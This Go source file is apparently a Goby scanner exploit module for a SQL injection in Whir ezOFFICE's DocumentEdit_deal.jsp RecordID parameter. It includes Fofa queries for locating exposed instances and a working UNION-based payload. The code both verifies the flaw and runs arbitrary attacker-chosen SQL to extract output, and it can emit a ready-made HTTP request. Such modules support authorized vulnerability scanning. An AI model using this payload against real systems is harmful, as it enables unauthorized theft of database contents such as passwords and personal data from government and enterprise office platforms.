package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Whir ezOFFICE DocumentEdit_deal.jsp file RecordID parameter SQL injection vulnerability",
    "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>Whir ezOFFICE DocumentEdit_deal.jsp file has a SQL injection vulnerability, which allows an attacker to obtain sensitive database information.</p>",
    "Product": "Wanjia-EZOffice-Collaborative-MP",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2023-03-15",
    "Author": "heiyeleng",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.whir.net/.\">https://www.whir.net/</a>.</p>",
    "References": [
        "http://www.whir.net/cn/ezofficeqyb/index_52.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE DocumentEdit_deal.jsp 文件 RecordID 参数 SQL 注入漏洞",
            "Product": "万户ezOFFICE协同管理平台",
            "Description": "<p>万户 ezOFFICE 是面向政府组织及企事业单位的 FlexOffice 自主安全协同办公平台。</p><p>万户 ezOFFICE DocumentEdit_deal.jsp 文件存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.whir.net/\">https://www.whir.net/</a><br></p>",
            "Impact": "<p>除了利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Whir ezOFFICE DocumentEdit_deal.jsp file RecordID parameter SQL injection vulnerability",
            "Product": "Wanjia-EZOffice-Collaborative-MP",
            "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>Whir ezOFFICE DocumentEdit_deal.jsp file has a SQL injection vulnerability, which allows an attacker to obtain sensitive database information.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.whir.net/.\">https://www.whir.net/</a>.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10840"
}`

	sendPaylaodcf3bf4e5 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=" + url.QueryEscape("1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,("+sql+"),NULL,NULL,NULL,NULL,NULL,NULL-- "))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			sql := "select 0x" + hex.EncodeToString([]byte(checkStr))
			rsp, _ := sendPaylaodcf3bf4e5(u, sql)
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {
				rsp, err := sendPaylaodcf3bf4e5(expResult.HostInfo, sql)
				expResult.Success = false
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.Utf8Html, "webform.WebOffice.FileType=") {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "webform.WebOffice.FileType=\"")+28 : strings.Index(rsp.Utf8Html, "\";   //FileType")]
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "sqlPoint" {
				checkStr := goutils.RandomHexString(8)
				sql = "select 0x" + hex.EncodeToString([]byte(checkStr))
				rsp, _ := sendPaylaodcf3bf4e5(expResult.HostInfo, sql)
				expResult.Success = rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr)
				if expResult.Success {
					expResult.Output = `GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=` + url.QueryEscape("1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,("+sql+"),NULL,NULL,NULL,NULL,NULL,NULL-- ") + ` HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
